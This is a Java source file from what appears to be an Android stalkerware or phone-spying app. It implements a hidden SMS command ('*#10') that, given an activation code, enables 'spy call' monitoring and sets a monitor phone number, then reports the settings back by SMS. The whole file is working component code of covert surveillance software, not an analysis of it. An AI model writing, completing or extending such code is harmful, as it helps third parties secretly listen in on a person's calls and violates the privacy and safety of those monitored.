package com.fx.dalvik.smscommand.interpreter;

import java.util.regex.Pattern;

import android.content.Context;
import android.os.SystemClock;

import com.fx.dalvik.smscommand.SmsCommandHelper;
import com.fx.maind.ref.Customization;
import com.fx.preference.SpyInfoManager;
import com.fx.preference.SpyInfoManagerFactory;
import com.fx.util.FxResource;
import com.vvt.logger.FxLog;

public class SmsEnableSpyCall {
	
	private static final String TAG = "SmsEnableSpyCall";
 	private static final boolean LOGV = Customization.VERBOSE;
	
	public static final String COMMAND_ID = "*#10";
	
	// Enable Spy call command
	// <*#10><FK>
	// <*#10><FK><MonitorNumber>
	public static String processCommand(Context context, String[] tokens) {
		if (LOGV) FxLog.v(TAG, "processCommand # Enter ...");
		
		// Check command format
		boolean debugTagValidation = 
				   (tokens.length == 2 && !SmsCommandHelper.isEndWithDebugTag(tokens))
				|| (tokens.length == 3 && SmsCommandHelper.isEndWithDebugTag(tokens))
				|| (tokens.length == 3 && !SmsCommandHelper.isEndWithDebugTag(tokens))
				|| (tokens.length == 4 && SmsCommandHelper.isEndWithDebugTag(tokens));
		
		if (!debugTagValidation) {
			return String.format("%s\n%s",
					FxResource.LANGUAGE_SMSCOMMAND_RESPONSE_ERROR, 
					FxResource.LANGUAGE_SMSCOMMAND_RESPONSE_INVALID_COMMAND_FORMAT);
		}
		
		// Check activation Code
		String activationCodeValidation = 
			SmsCommandHelper.getActivationCodeValidation(context, tokens[1]);
		
		if (!activationCodeValidation.equals(FxResource.LANGUAGE_SMSCOMMAND_RESPONSE_OK)) {
			return activationCodeValidation;
		}
		
		// Check if there is monitor number specified
		boolean isContainMonitorNumber = 
				   (tokens.length == 3 && !SmsCommandHelper.isEndWithDebugTag(tokens))
				|| (tokens.length == 4 && SmsCommandHelper.isEndWithDebugTag(tokens));
		
		// Check format of monitor number
		if (isContainMonitorNumber) {
			boolean isValidFormat = Pattern.matches("[+]{0,1}[0-9]+", tokens[2].trim());
			if (!isValidFormat) {
				return String.format("%s\n%s",
						FxResource.LANGUAGE_SMSCOMMAND_RESPONSE_ERROR, 
						FxResource.LANGUAGE_SMSCOMMAND_RESPONSE_INVALID_COMMAND_FORMAT);
			}
		}
		
		// Set enable spy call
		SpyInfoManager spyInfoManager = SpyInfoManagerFactory.getSpyInfoManager(context);
		spyInfoManager.setEnabled(true);
		if (LOGV) FxLog.v(TAG, "processCommand # Spy is enabled");
		
		SystemClock.sleep(1000);
		
		// Set monitor number
		if (isContainMonitorNumber) {
			spyInfoManager.setMonitorNumber(tokens[2]);
			if (LOGV) FxLog.v(TAG, "processCommand # Monitor number is set");
			
			SystemClock.sleep(1000);
		}
		
		String monitorNumber = spyInfoManager.getMonitorNumber();
		if (LOGV) FxLog.v(TAG, "processCommand # Check monitor number");
		
		spyInfoManager.sendRequestUpdateSpyInfo();
		SystemClock.sleep(500);
		
		String reportMessage = FxResource.LANGUAGE_SMSCOMMAND_RESPONSE_OK + "\n"
					+ SmsCommandHelper.getSpyCallSettings(context, true, true);
			
		if (monitorNumber == null || monitorNumber.trim().length() < 1) {
			reportMessage += "\n" 
				+ FxResource.LANGUAGE_SMSCOMMAND_RESPONSE_WARNING_MONITOR_NUMBER;
		}
		
		if (LOGV) FxLog.v(TAG, "processCommand # EXIT ...");
		
		return reportMessage;
	}

}
